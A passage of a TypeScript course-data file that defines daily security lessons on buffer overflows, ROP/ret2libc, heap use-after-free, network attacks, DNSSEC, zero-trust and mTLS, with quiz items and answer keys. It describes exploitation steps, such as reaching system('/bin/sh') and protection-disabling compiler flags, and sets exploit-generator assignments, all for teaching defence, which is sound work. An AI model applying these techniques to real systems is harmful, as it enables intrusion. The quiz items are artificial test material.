      scenario: "During the final Viva Examination, the Chief Information Security Officer (CISO) asks: 'Your CyberShield gateway passes all automated OWASP Top 10 tests. But how does it handle an authenticated user attempting to rapidly probe 10,000 distinct customer account numbers while keeping their request rate under the per-IP threshold?' How do you defend your architecture?",
      options: [
        "Claim that customer account numbers are public information anyway.",
        "Defense-in-Depth Architectural Defense: CyberShield incorporates multi-dimensional rate limiting that tracks velocity per account entity, enforces ABAC ownership queries at the data tier that immediately reject unauthorized accesses with HTTP 403, and flags anomalous access pattern spikes to the automated SOAR audit pipeline to trigger immediate session quarantine.",
        "Suggest buying more servers.",
        "Disable API access for all customers."
      ],
      answerIdx: 1,
      debrief: "A senior security engineer defends systems using defense-in-depth: combining entity-level rate limiting, strict database-level ABAC ownership enforcement, and real-time anomaly detection to defeat low-and-slow distributed attacks."
    },
    quests: [
      { id: "sec-m1-d30-q1", name: "CyberShield Architecture & End-to-End Threat Model Defense", type: "concept", desc: "Document the complete architectural blueprint and STRIDE threat model of the CyberShield Defense Gateway." },
      { id: "sec-m1-d30-q2", name: "Red Team Challenge: Automated OWASP Top 10 Penetration Battery", type: "detective", desc: "Execute an automated penetration test suite executing SQLi, XSS, CSRF, SSRF, BOLA, and JWT attack payloads against CyberShield." },
      { id: "sec-m1-d30-q3", name: "Mastery Assignment: CyberShield Production Reverse-Proxy Deployment", type: "assignment", desc: "Package and deploy the complete CyberShield gateway with Docker, TLS certificates, Redis cluster caching, and health probes." },
      { id: "sec-m1-d30-q4", name: "Month 1 Capstone Viva: Live Architecture Defense before Staff Security Panel", type: "assignment", desc: "Defend your cryptographic primitives, threat boundaries, and incident response runbooks in a rigorous oral viva examination." }
    ]
  }
];

export const CYBERSECURITY_MONTH_2_SPECS: MasterclassDaySpec[] = [
  // ─── BLOCK 7: Binary Exploitation & Memory Safety (Days 31–35) ────────────────
  {
    day: 31,
    month: 2,
    blockNum: 7,
    title: "Memory Layout & Stack Smashing: Buffer Overflows, Return Address & Shellcode",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (x86-64 Stack Frame Architecture)",
    spokenGoal: "Deconstruct binary execution at the assembly level: explore the x86-64 process memory layout (Stack, Heap, BSS, Data, Text), analyze function call frames (RSP, RBP, Return Address), understand how unbounded buffer copies (`strcpy`, `gets`) smash the stack, and trace shellcode instruction execution.",
    conceptInvariant: "Control Flow Integrity Invariant: Function call return addresses pushed onto the execution stack ($RSP$) dictate CPU instruction pointer ($RIP$) destination upon executing the `ret` opcode. Writing beyond allocated local stack buffers overwrites the saved $RBP$ and return address, granting the attacker arbitrary control of the CPU instruction pointer.",
    failureMode: "Using `strcpy(dest, src)` in a high-performance C/C++ network gateway: an attacker sends a 256-byte payload into a 64-byte buffer, overwriting the saved frame pointer and return address with the address of injected shellcode, spawning a root shell.",
    tryItFriction: "Analyze a vulnerable C network daemon binary in GDB: inspect register values ($RSP$, $RBP$), calculate the exact 72-byte padding offset to reach the return address, and craft an exploit payload that redirects execution to a target function.",
    socraticHints: [
      "Where is the return address located relative to local variables in an x86-64 stack frame?",
      "Local variables sit at lower memory addresses; writing forward towards higher addresses overwrites the saved $RBP$ (8 bytes) and then the Return Address (8 bytes)!",
      "Calculate: `buffer_size + saved_rbp_bytes = offset` to reach the return address pointer."
    ],
    situationalPuzzle: {
      scenario: "A legacy billing daemon written in C crashes with `SIGSEGV` at memory address `0x4141414141414141`. The core dump shows that the instruction pointer ($RIP$) holds this exact value. What happened inside the CPU?",
      options: [
        "The computer had bad RAM hardware.",
        "Stack Buffer Overflow Exploit: The character 'A' has hex ASCII value `0x41`. An unbounded input copied 8 'A's over the return address. When the function executed `ret`, the CPU attempted to jump to memory address `0x4141414141414141`, triggering a segmentation fault.",
        "The compiler ran out of register variables.",
        "The hard drive filled up during billing."
      ],
      answerIdx: 1,
      debrief: "`0x41` is ASCII 'A'. Seeing $RIP$ populated with `0x41414141...` is the textbook indicator of an attacker overflowing a local buffer and successfully overwriting the function return address to hijack control flow."
    },
    quests: [
      { id: "sec-m2-d31-q1", name: "x86-64 Process Memory Anatomy & Call Stack Mechanics", type: "concept", desc: "Map Text, Data, BSS, Heap (grows up), Stack (grows down), and calling conventions (System V AMD64 ABI)." },
      { id: "sec-m2-d31-q2", name: "Detective Lab: GDB Stack Frame Dissection & Offset Calculation", type: "detective", desc: "Use GDB and radare2 to step through function prologues (`push rbp; mov rbp, rsp`) and identify the exact buffer overflow offset." },
      { id: "sec-m2-d31-q3", name: "Mastery Assignment: Binary Stack Overflow Exploit Generator", type: "assignment", desc: "Construct a Python / TypeScript exploit payload generator calculating NOP sleds, shellcode padding, and return address overwrite values." },
      { id: "sec-m2-d31-q4", name: "Production Incident Lab: Triage of SIGSEGV Crash in High-Throughput Gateway", type: "detective", desc: "Perform post-mortem triage on a production core dump to determine if a segmentation fault was an organic bug or malicious stack smash." }
    ]
  },
  {
    day: 32,
    month: 2,
    blockNum: 7,
    title: "Modern Exploit Mitigations: Stack Canaries (__stack_chk_fail), NX / DEP, ASLR & PIE",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Compiler & OS Exploit Mitigations)",
    spokenGoal: "Master the 4 fundamental defenses that neutralise raw buffer overflows: Stack Canaries (random sentinel bytes before saved RBP), Non-Executable Memory (NX / Data Execution Prevention DEP), Address Space Layout Randomization (ASLR), and Position Independent Executables (PIE).",
    conceptInvariant: "Defense Synergy Invariant: Exploit mitigations operate as an interdependent defense chain. Stack canaries detect linear buffer overwrites before return; NX/DEP prevents executing code on the stack or heap ($W \\oplus X$: Write XOR Execute); ASLR randomizes memory segment base addresses; and PIE randomizes binary code offsets. Bypassing one requires chaining leaks across the others.",
    failureMode: "Compiling a C++ network daemon with `-fno-stack-protector -z execstack -no-pie`, completely disabling all modern compiler protections and allowing trivial 1990s-style shellcode injection in a 2026 production environment.",
    tryItFriction: "Use `checksec` to audit binary hardening flags, analyze how GCC inserts `__stack_chk_guard` checks before the `ret` instruction, and demonstrate how stack canary corruption aborts the process immediately via `__stack_chk_fail()`.",
    socraticHints: [
      "What is a Stack Canary and where is it positioned?",
      "It is a random 8-byte value placed on the stack immediately between local buffers and the saved RBP!",
      "If a buffer overflow writes past its boundary, it corrupts the canary; the function checks the canary before `ret` and calls `abort()` if changed."
    ],
    situationalPuzzle: {
      scenario: "An enterprise binary has NX/DEP enabled ($W \\oplus X$). An attacker successfully overwrites the return address with the address of their shellcode located on the stack. The CPU attempts to execute the first shellcode instruction and immediately terminates with `SIGSEGV` (Permission Violation). Why did the shellcode fail to execute?",
      options: [
        "The CPU ran out of power.",
        "Non-Executable Stack (NX / DEP) Enforcement: The memory page table entry for the stack segment has the NX bit set (No-Execute). The MMU hardware permits reading and writing data on the stack, but hardware-blocks CPU instruction fetching from that page.",
        "The shellcode contained an invalid ASCII character.",
        "The operating system time was incorrect."
      ],
      answerIdx: 1,
      debrief: "Data Execution Prevention (DEP / NX) enforces the $W \\oplus X$ (Write XOR Execute) policy: memory pages can be writable or executable, but never both. Injecting shellcode into a writable stack buffer is rendered inert because the CPU hardware refuses to execute code from stack memory pages."
    },
    quests: [
      { id: "sec-m2-d32-q1", name: "Compiler Mitigations: Canaries, NX, ASLR, and RELRO", type: "concept", desc: "Detail stack canaries (FS register), Page Table NX bit, kernel entropy in ASLR, and Full RELRO GOT protection." },
      { id: "sec-m2-d32-q2", name: "Detective Lab: Auditing Production Binaries with Checksec", type: "detective", desc: "Run checksec against internal compiled microservices and flag any binaries missing PIE, Canary, NX, or Full RELRO." },
      { id: "sec-m2-d32-q3", name: "Mastery Assignment: Automated Binary Hardening Verification CI Action", type: "assignment", desc: "Build a CI pipeline step that parses ELF headers and rejects any binary artifacts lacking enterprise security flags." },
      { id: "sec-m2-d32-q4", name: "Production Incident Lab: Stack Canary Breach Alert Forensics", type: "detective", desc: "Triage a production alert where an internal process aborted with `*** stack smashing detected ***: terminated`." }
    ]
  },
  {
    day: 33,
    month: 2,
    blockNum: 7,
    title: "Return-Oriented Programming (ROP): Gadget Chaining, libc Leakage & ret2libc Exploitation",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Code Reuse Attacks & ROP Gadgets)",
    spokenGoal: "Overcome NX/DEP using code-reuse techniques: understand Return-Oriented Programming (ROP), learn how attackers scan existing executable memory for 'gadgets' (short instruction sequences ending in `ret`), chain gadgets to set CPU registers, leak `libc` base addresses to defeat ASLR, and execute `system('/bin/sh')`.",
    conceptInvariant: "Turing-Complete Code Reuse Invariant: Even when memory is non-executable ($NX$), the binary itself and loaded shared libraries (`libc.so`) contain millions of executable instructions. By stitching together gadget addresses on the stack, an attacker can achieve arbitrary computation and syscall execution without injecting a single byte of executable shellcode.",
    failureMode: "Assuming NX/DEP makes buffer overflows harmless: an attacker leverages a format string vulnerability to leak a `puts()` pointer from `libc`, calculates the randomized `libc` base address, and executes a `ret2libc` ROP chain invoking `system('/bin/sh')`.",
    tryItFriction: "Use `ROPgadget` to find `pop rdi; ret` gadgets in a compiled binary, and assemble a ROP chain on the stack that populates register `$RDI` with a string pointer and calls a target function.",
    socraticHints: [
      "Why does a ROP gadget always end in a `ret` instruction?",
      "Because when the gadget finishes, the `ret` opcode pops the NEXT gadget address from the stack into $RIP$!",
      "Chain: `[gadget_1_address] [arg_for_gadget_1] [gadget_2_address] [target_function_address]`."
    ],
    situationalPuzzle: {
      scenario: "An attacker attempts a ROP exploit against a binary protected by ASLR. They hardcode the address of `system()` in their ROP chain as `0x7ffff7a52390`. On execution, the application crashes because the address points to invalid memory. Why did the hardcoded address fail?",
      options: [
        "ASLR was disabled.",
        "ASLR Base Address Randomization: Under ASLR, shared libraries (`libc`) are loaded at a random base address on every process execution. The attacker must first trigger an information leak to discover a live runtime pointer, subtract the known offset to determine the base, and calculate the dynamic address.",
        "The CPU changed from x86 to ARM.",
        "The Linux kernel restricts system calls to root."
      ],
      answerIdx: 1,
      debrief: "ASLR randomizes library load addresses on every run. Hardcoded pointers will crash. To bypass ASLR, attackers must first find an information leak (e.g. leaking a GOT pointer via `puts`), compute the dynamic `libc` base address, and calculate the exact runtime address of `system()`."
    },
    quests: [
      { id: "sec-m2-d33-q1", name: "ROP Gadgetry & x86-64 Register Calling Conventions", type: "concept", desc: "Analyze how System V AMD64 ABI registers ($RDI, $RSI, $RDX, $RCX, $R8, $R9) are populated using pop gadgets." },
      { id: "sec-m2-d33-q2", name: "Detective Lab: Discovering ROP Gadgets with ROPgadget & Ropper", type: "detective", desc: "Scan a compiled ELF binary for control flow gadgets and verify stack alignment requirements (16-byte stack boundary)." },
      { id: "sec-m2-d33-q3", name: "Mastery Assignment: Ret2libc ROP Chain Exploit Compiler", type: "assignment", desc: "Construct a TypeScript tool that parses ELF symbols, calculates libc offsets, and compiles a functional ret2libc ROP chain." },
      { id: "sec-m2-d33-q4", name: "Production Incident Lab: Detection of In-Memory ROP Sled Anomaly", type: "detective", desc: "Analyze an EDR telemetry alert detecting unnatural call-stack unwind patterns characteristic of ROP execution." }
    ]
  },
  {
    day: 34,
    month: 2,
    blockNum: 7,
    title: "Heap Exploitation: Use-After-Free (UAF), Double Free & Chunk Metadata Corruption",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Dynamic Memory Allocators & Glibc Ptmalloc)",
    spokenGoal: "Delve into heap internals: explore how `malloc()` and `free()` manage chunk metadata, bins (tcache, fastbins, unsorted bins), dissect Use-After-Free (UAF) and Double Free vulnerabilities, and understand how modern allocators detect dangling pointer reallocations.",
    conceptInvariant: "Pointer Invalidation Invariant: Once a heap memory block is released via `free()`, all pointers referencing that chunk become invalid dangling pointers and must be immediately zeroed out (`ptr = NULL`). If a program continues using a freed pointer, an attacker can reallocate that memory chunk with controlled data, hijacking function pointers or vtables.",
    failureMode: "Freeing an object containing a function pointer without setting the pointer to `NULL`: an attacker allocates a new string of identical size that occupies the same heap chunk, overwrites the function pointer, and triggers a call to arbitrary code.",
    tryItFriction: "Analyze a C++ program with a Use-After-Free flaw: trace how `tcache` reallocates the recently freed chunk to a new object, and demonstrate how setting the pointer to `nullptr` immediately mitigates the exploit.",
    socraticHints: [
      "Why does a newly allocated object occupy the exact same memory address as a recently freed object?",
      "Because heap allocators use caching bins (like glibc's tcache) for fast LIFO reuse of identical-sized chunks!",
      "Always set freed pointers to NULL (`free(p); p = NULL;`) so subsequent dereferences trigger an immediate safe crash instead of UAF."
    ],
    situationalPuzzle: {
      scenario: "An enterprise browser engine contains a bug where a DOM node is freed, but an event listener retains a reference to it. An attacker rapidly creates 10,000 image objects of the same byte size. The browser executes an attacker-controlled function pointer when the event fires. What heap exploitation technique was utilized?",
      options: [
        "Stack Smashing.",
        "Heap Grooming & Use-After-Free (UAF) Exploitation: The attacker groomed the heap by allocating objects that reclaim the freed chunk's memory slot. When the program calls the virtual method on the dangling pointer, it invokes the attacker's hijacked vtable.",
        "SQL Injection inside the browser.",
        "The GPU driver crashed."
      ],
      answerIdx: 1,
      debrief: "This is classic Heap Spraying and Use-After-Free (UAF). By allocating objects of identical size, the allocator places controlled data into the victim's freed memory block. When the application invokes a method on the dangling pointer, it executes the hijacked pointer."
    },
    quests: [
      { id: "sec-m2-d34-q1", name: "Glibc Ptmalloc Architecture: Chunks, Bins & Tcache Mechanics", type: "concept", desc: "Detail chunk headers (size, PREV_INUSE), forward/backward pointers, and double-free detection checks." },
      { id: "sec-m2-d34-q2", name: "Detective Lab: Tracing Use-After-Free Pointer Reallocation in Valgrind", type: "detective", desc: "Run Valgrind / AddressSanitizer (ASan) to catch heap-use-after-free and double-free memory corruption events." },
      { id: "sec-m2-d34-q3", name: "Mastery Assignment: Safe Pointer Lifecycle Wrapper & Allocator Guard", type: "assignment", desc: "Implement a C++ / Rust memory wrapper enforcing strict ownership, zeroization on free, and nullification invariants." },
      { id: "sec-m2-d34-q4", name: "Production Incident Lab: Zero-Day UAF Exploit in High-Performance Cache Service", type: "detective", desc: "Triage a zero-day vulnerability in an in-memory caching engine that allowed unauthenticated memory reading via UAF." }
    ]
  },
  {
    day: 35,
    month: 2,
    blockNum: 7,
    title: "⭐ MILESTONE 6: Memory Safety Hardening & Exploit Mitigation Engine (Rust FFI & ASLR/DEP)",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Milestone Gate: Memory Safety Hardening)",
    spokenGoal: "Assemble Milestone 6: Engineer an exploit mitigation and memory safety verification engine: replace dangerous C/C++ memory primitives with memory-safe Rust FFI wrappers, enforce compiler hardening (PIE, Full RELRO, Stack Canaries), and implement dynamic AddressSanitizer (ASan) test suites.",
    conceptInvariant: "Memory Safety by Construction Invariant: 70% of all critical CVEs in high-performance software stem from memory safety violations (buffer overflows, UAF, double free). Migrating performance-critical components to memory-safe languages (Rust) with strict compile-time borrow checkers eliminates these entire vulnerability classes by construction.",
    failureMode: "Exposing a raw C string buffer over an FFI boundary to a modern web backend without length bounds checking, creating a bridge where client input can smash the backend process stack.",
    tryItFriction: "Complete Milestone 6 by creating a memory-hardened Rust FFI module that parses network packets safely with zero-copy slices, rejecting invalid lengths and guaranteeing zero buffer overflows.",
    socraticHints: [
      "Why does Rust eliminate Use-After-Free and Buffer Overflows at compile time?",
      "Because Rust's ownership and borrow checker guarantees that every memory reference is valid and no dangling pointers can exist!",
      "Wrap low-level packet parsing in safe Rust slices (`&[u8]`) with bounds checking."
    ],
    situationalPuzzle: {
      scenario: "A fintech firm rewrites its payment parsing gateway from C to Rust. A legacy team member asks: 'Does Rust guarantee that our system is 100% secure from all cyber attacks?' How do you answer as a Staff Security Architect?",
      options: [
        "Yes, Rust makes all types of security vulnerabilities mathematically impossible.",
        "Memory Safety vs Logic Flaws Distinction: Rust mathematically eliminates memory-safety vulnerabilities (buffer overflows, UAF, double free, data races). However, application-level logic flaws (SQLi, IDOR, SSRF, broken authentication, cryptographic misconfigurations) still require rigorous architectural defense.",
        "No, Rust is less secure than C because it lacks manual memory management.",
        "Rust only protects against network denial of service."
      ],
      answerIdx: 1,
      debrief: "Rust eliminates memory corruption bugs, which historically account for ~70% of major software exploits. However, higher-level logic bugs (authorization bypasses, cryptographic misuses, injection attacks) remain the developer's responsibility to prevent."
    },
    quests: [
      { id: "sec-m2-d35-q1", name: "Milestone 6 Architecture: Memory-Safe Systems Engineering", type: "concept", desc: "Design a hybrid architecture isolating legacy C components with memory-safe Rust FFI wrappers and sandboxing." },
      { id: "sec-m2-d35-q2", name: "Detective Lab: Verifying Zero-Tolerance Memory Corruption via AddressSanitizer", type: "detective", desc: "Compile code with `-fsanitize=address` and fuzz it with 100,000 malformed inputs to prove absence of memory leaks." },
      { id: "sec-m2-d35-q3", name: "Mastery Assignment: Memory-Safe Packet Parsing Engine with Rust FFI", type: "assignment", desc: "Build a memory-safe network packet parser in Rust with C FFI bindings that guarantees zero buffer overruns." },
      { id: "sec-m2-d35-q4", name: "Production Incident Lab: Exploit Neutralization Post-Mortem in Core Network Engine", type: "detective", desc: "Verify that an attempted remote exploit was successfully neutralized by memory-safe bounds enforcement." }
    ]
  },

  // ─── BLOCK 8: Network Protocol Exploits & Zero-Trust Architecture (Days 36–40) ───
  {
    day: 36,
    month: 2,
    blockNum: 8,
    title: "Low-Level Network Attacks: ARP Spoofing, TCP SYN Floods, RST Injection & BGP Hijacking",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Network Layer Protocol Exploitation)",
    spokenGoal: "Dissect attacks across the OSI model: analyze Layer 2 ARP Cache Poisoning, Layer 4 TCP SYN flood state exhaustion (and SYN Cookies mitigation), TCP RST packet injection, and Internet routing BGP hijacking (RPKI validation).",
    conceptInvariant: "Network Layer Authentication Invariant: Raw TCP/IP protocols were designed without built-in cryptographic authentication. IP addresses and MAC addresses can be spoofed on local networks. Cryptographic transport security (TLS 1.3 / IPsec) is mandatory because network packets can be intercepted, forged, or redirected at any hop.",
    failureMode: "Relying on client IP addresses in `req.connection.remoteAddress` to authorize internal administrative API calls on a shared local network, allowing an attacker to ARP-spoof the router or inject forged TCP packets to execute admin commands.",
    tryItFriction: "Analyze a TCP SYN flood in Wireshark: observe the half-open connection backlog filling the kernel socket buffer, and configure Linux kernel SYN cookies (`sysctl -w net.ipv4.tcp_syncookies=1`) to defeat the denial of service.",
    socraticHints: [
      "How do SYN Cookies allow a server to survive a SYN flood without allocating memory?",
      "By encoding the TCP connection state cryptographically into the 32-bit initial sequence number ($ISN$) of the SYN-ACK packet!",
      "The server allocates zero memory until the client returns the final ACK containing the valid cookie."
    ],
    situationalPuzzle: {
      scenario: "A cryptocurrency exchange's DNS traffic is suddenly redirected to a rogue server for 2 hours, resulting in thousands of users entering credentials on a clone site. The DNS registrar was not hacked, and the server was uncompromised. Network telemetry shows that an autonomous system in another country announced the exchange's IP prefix. What attack occurred?",
      options: [
        "A SQL injection on the web server.",
        "BGP Prefix Hijacking Attack: An adversary maliciously announced a more specific BGP routing prefix (e.g., /24 instead of /22) to upstream Internet transit providers. Because BGP routing favors more specific prefixes, global Internet traffic was rerouted to the attacker's infrastructure.",
        "The exchange's SSL certificate expired.",
        "The database crashed from too many transactions."
      ],
      answerIdx: 1,
      debrief: "BGP Hijacking occurs when a rogue Autonomous System announces another entity's IP prefixes. The defense is Resource Public Key Infrastructure (RPKI) and Route Origin Authorization (ROA), which cryptographically binds IP prefixes to authorized autonomous systems."
    },
    quests: [
      { id: "sec-m2-d36-q1", name: "TCP/IP Protocol State Machines & Layer 2/3 Vulnerabilities", type: "concept", desc: "Trace ARP caches, TCP 3-way handshake state tables, SYN queues, and BGP path vector mechanics." },
      { id: "sec-m2-d36-q2", name: "Detective Lab: Reconstructing ARP Poisoning MitM in Packet Captures", type: "detective", desc: "Inspect a pcap file to identify gratuitous ARP responses redirecting gateway MAC addresses." },
      { id: "sec-m2-d36-q3", name: "Mastery Assignment: Linux Kernel Network Hardening & SYN Cookie Tuner", type: "assignment", desc: "Build a TypeScript automation script tuning sysctl parameters for TCP syncookies, reverse path filtering (rp_filter), and RST defenses." },
      { id: "sec-m2-d36-q4", name: "Production Incident Lab: Triage of BGP Route Leak & DNS Hijacking Outage", type: "detective", desc: "Coordinate an incident response war room mitigating an ongoing BGP prefix leak targeting corporate infrastructure." }
    ]
  },
  {
    day: 37,
    month: 2,
    blockNum: 8,
    title: "DNS Security Extensions (DNSSEC): RRSIG, DNSKEY, Chain of Trust & Kaminsky Attack",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Domain Name Cryptographic Authentication)",
    spokenGoal: "Secure the domain name resolution chain: analyze Dan Kaminsky's 2008 DNS cache poisoning attack, understand why randomized UDP source ports are an incomplete mitigation, and implement Domain Name System Security Extensions (DNSSEC) using RRSIG, DNSKEY, DS records, and cryptographic trust anchors.",
    conceptInvariant: "DNS Cryptographic Provenance Invariant: DNSSEC does not encrypt DNS queries; it cryptographically signs DNS Resource Record Sets (RRsets). A validating resolver verifies that the digital signature (`RRSIG`) of the IP address record chains mathematically through Delegation Signer (`DS`) records up to the root DNS trust anchor (`.`).",
    failureMode: "Operating a recursive DNS resolver that does not validate DNSSEC signatures, allowing an attacker to flood the resolver with forged responses during a lookup and poison the cache, redirecting users to a phishing server for days.",
    tryItFriction: "Perform DNSSEC record queries using `dig +dnssec +trace`: inspect the `RRSIG`, `DNSKEY`, and `DS` records, and verify that tampering with a single byte in the A-record triggers an immediate `SERVFAIL` validation rejection.",
    socraticHints: [
      "Why does DNSSEC prevent cache poisoning where UDP port randomization fails?",
      "Because DNSSEC requires a cryptographic digital signature made with the domain owner's private key, which the attacker cannot forge!",
      "Verify the `RRSIG` record against the `DNSKEY` public key, and verify the `DNSKEY` against the parent zone's `DS` hash."
    ],
    situationalPuzzle: {
      scenario: "An enterprise deploys DNSSEC on their domain. An attacker on the local Wi-Fi attempts to poison the DNS resolver to point `secure.bank.com` to a malicious IP. When the client browser makes the request, it receives an immediate error: `DNSSEC validation failed (SERVFAIL)`. What cryptographic verification failed?",
      options: [
        "The client browser ran out of memory.",
        "DNSSEC Signature Verification Failure: The local validating DNS resolver checked the received A-record against the RRSIG cryptographic signature using the bank's DNSKEY. The attacker's forged IP did not match the signature, causing the resolver to discard the forged response and return SERVFAIL.",
        "The bank's web server was offline.",
        "DNSSEC requires paid licensing fees."
      ],
      answerIdx: 1,
      debrief: "DNSSEC validating resolvers reject any DNS response whose cryptographic signature does not validate against the authenticated DNSKEY and DS chain of trust. Forged responses are dropped, protecting users from cache poisoning."
    },
    quests: [
      { id: "sec-m2-d37-q1", name: "Kaminsky Cache Poisoning & DNSSEC Trust Anchor Hierarchy", type: "concept", desc: "Detail transaction ID guessing math, birthday attacks on UDP ports, and the root trust anchor signing ceremony." },
      { id: "sec-m2-d37-q2", name: "Detective Lab: Verifying DNSSEC Cryptographic Chains via Dig & Delv", type: "detective", desc: "Trace the cryptographic DS and RRSIG verification chain from root (.) to TLD (.com) to leaf domain." },
      { id: "sec-m2-d37-q3", name: "Mastery Assignment: DNSSEC Zone Signing & Validating Resolver Engine", type: "assignment", desc: "Implement a TypeScript DNS resolver that validates RRSIG signatures and enforces DS record matching." },
      { id: "sec-m2-d37-q4", name: "Production Incident Lab: Outage Triage after Broken DNSSEC Key Rollover", type: "detective", desc: "Resolve a global DNS outage caused by an out-of-sync KSK/ZSK key rollover that triggered SERVFAIL rejections globally." }
    ]
  },
  {
    day: 38,
    month: 2,
    blockNum: 8,
    title: "Zero-Trust Network Architecture (ZTNA): Software-Defined Perimeters & BeyondCorp",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Enterprise Zero-Trust Identity Perimeters)",
    spokenGoal: "Transition from legacy VPNs to Zero-Trust Network Architecture (ZTNA): study Google's BeyondCorp model, replace network-level trust with application-level identity proxies, enforce continuous device health attestation (MDM/TPM), and implement dynamic contextual access policies.",
    conceptInvariant: "Never Trust, Always Verify Invariant: Network locality (being inside the corporate office or connected to an internal VPN) confers ZERO trust. Every access request to every enterprise service must be authenticated, authorized, and encrypted based on user identity, device security posture, and real-time context, regardless of where the request originates.",
    failureMode: "Relying on a corporate VPN that grants full Layer 3 access to the internal network: an employee's laptop is infected with malware, and the malware traverses the VPN to scan and compromise sensitive internal databases and build servers.",
    tryItFriction: "Design a contextual ZTNA access policy in TypeScript that evaluates user role, device compliance status (disk encrypted, firewall enabled), geolocation, and impossible travel velocity before granting access to an internal tool.",
    socraticHints: [
      "Why is a corporate VPN considered a dangerous legacy architecture?",
      "Because once an attacker compromises a single endpoint, the VPN grants them broad network visibility and lateral movement across the entire company!",
      "ZTNA exposes individual applications through an identity proxy; users never join the internal network directly."
    ],
    situationalPuzzle: {
      scenario: "An enterprise replaces their corporate VPN with a Zero-Trust Application Proxy. A remote engineer logs in from their personal, unmanaged home desktop using valid corporate credentials. The proxy displays an access denied page: 'Device Compliance Failed: Hardware TPM attestation missing and disk encryption not detected'. Why did the proxy block access despite valid credentials?",
      options: [
        "The engineer typed the wrong password.",
        "Device Context & Posture Attestation Enforcement: ZTNA evaluates both identity AND device posture. Valid user credentials alone are insufficient; access is denied unless the device is managed, healthy, encrypted, and cryptographically attested via hardware TPM.",
        "The proxy server crashed.",
        "Home Wi-Fi routers do not support HTTPS."
      ],
      answerIdx: 1,
      debrief: "Zero-Trust Architecture evaluates the complete context: User Identity + Device Posture + Network Signals. A compromised personal device with valid credentials represents an unmanaged risk and must be denied access to corporate resources."
    },
    quests: [
      { id: "sec-m2-d38-q1", name: "BeyondCorp Architecture: Context-Aware Identity Proxies", type: "concept", desc: "Examine enterprise device inventories, access control engines, and identity-aware proxies (IAP)." },
      { id: "sec-m2-d38-q2", name: "Detective Lab: Auditing VPN Lateral Movement vs ZTNA Microsegmentation", type: "detective", desc: "Simulate an attacker pivoting across a flat corporate subnet versus being contained by a Zero-Trust application proxy." },
      { id: "sec-m2-d38-q3", name: "Mastery Assignment: Contextual Zero-Trust Access Decision Engine", type: "assignment", desc: "Build a TypeScript ZTNA policy evaluator calculating risk scores based on user claims, device posture, and IP velocity." },
      { id: "sec-m2-d38-q4", name: "Production Incident Lab: Containing Malware on Compromised Remote Laptop", type: "detective", desc: "Verify that an active infostealer malware infection on an employee laptop was completely blocked from accessing cloud production systems." }
    ]
  },
  {
    day: 39,
    month: 2,
    blockNum: 8,
    title: "Service-to-Service Cryptographic Identity: SPIFFE / SPIRE & Mutual TLS (mTLS) Mesh",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Workload Attestation & Ephemeral X.509 SVIDs)",
    spokenGoal: "Eliminate static API keys and passwords between backend microservices: master Secure Production Identity Framework for Everyone (SPIFFE) and SPIFFE Runtime Environment (SPIRE), issue ephemeral X.509 SVID certificates based on kernel workload attestation, and enforce mutual TLS (mTLS).",
    conceptInvariant: "Workload Attestation Invariant: Microservices must not authenticate using static shared secrets (passwords, long-lived API tokens) that can leak into git or environment variables. Identity must be asserted via kernel-level workload attestation (cgroups, process UID, container hash) and attested by an agent issuing short-lived (1-hour) X.509 certificates.",
    failureMode: "Hardcoding a shared static bearer token in Kubernetes secrets for microservice communication: an attacker breaches one non-critical logging pod, extracts the token from `/var/run/secrets`, and invokes billing microservices directly.",
    tryItFriction: "Configure a SPIFFE ID parser and mTLS verification middleware in TypeScript that extracts the SPIFFE ID (`spiffe://prod.acme.com/ns/billing/sa/payment-worker`) from the client certificate SAN and enforces strict caller authorization.",
    socraticHints: [
      "What is the difference between standard TLS and Mutual TLS (mTLS)?",
      "Standard TLS only authenticates the server to the client; mTLS requires BOTH the client and the server to present and verify X.509 certificates!",
      "Extract the client's SPIFFE ID from `cert.subjectAltName` and verify that the calling service is authorized to invoke this API."
    ],
    situationalPuzzle: {
      scenario: "In an enterprise service mesh, Service A calls Service B over mTLS. An attacker spins up a rogue container inside the Kubernetes cluster and attempts to call Service B. The rogue container initiates a TLS connection, but Service B immediately rejects the handshake with `SSL alert: certificate required`. Why did the attack fail?",
      options: [
        "Kubernetes blocked the container from starting.",
        "Mutual TLS Client Authentication Enforcement: Service B enforces mTLS, requiring the client to present a valid X.509 SVID certificate signed by the SPIRE intermediate CA. The rogue container possessed no valid SVID and could not complete the cryptographic handshake.",
        "The rogue container had no IP address.",
        "Service B was powered off."
      ],
      answerIdx: 1,
      debrief: "With mTLS and SPIFFE/SPIRE, every service must present a cryptographically verified certificate. Attackers without a valid SVID issued by the workload attestation agent cannot establish a network connection, defeating rogue containers inside the cluster."
    },
    quests: [
      { id: "sec-m2-d39-q1", name: "SPIFFE Standards: Workload API, SVIDs & Attestation Mechanics", type: "concept", desc: "Detail SPIFFE ID URI format, X.509 SVID extensions, JWT SVIDs, and Linux kernel node/workload attestors." },
      { id: "sec-m2-d39-q2", name: "Detective Lab: Auditing Service Mesh mTLS Enforcement with Istio / Linkerd", type: "detective", desc: "Verify that all internal microservice communication is strictly mTLS-encrypted and rejects plaintext HTTP requests." },
      { id: "sec-m2-d39-q3", name: "Mastery Assignment: SPIFFE Workload Client & Ephemeral mTLS Gateway", type: "assignment", desc: "Build a TypeScript HTTP server and client that fetch ephemeral SVID certificates from the SPIRE Workload API and enforce mTLS." },
      { id: "sec-m2-d39-q4", name: "Production Incident Lab: Triage of Expired Workload SVID Outage in Service Mesh", type: "detective", desc: "Resolve a cascading microservice communication failure caused by a jammed SPIRE agent rotation loop." }
    ]
  },
  {
    day: 40,
    month: 2,
    blockNum: 8,
